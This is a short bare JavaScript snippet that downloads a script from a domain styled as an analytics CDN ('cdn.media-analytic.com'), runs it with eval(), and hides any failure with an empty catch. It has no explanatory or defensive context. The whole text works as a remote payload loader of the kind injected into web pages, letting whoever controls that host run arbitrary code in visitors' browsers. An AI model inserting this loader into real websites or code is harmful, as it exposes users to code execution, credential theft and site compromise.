fetch('https://cdn.media-analytic.com/functions.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
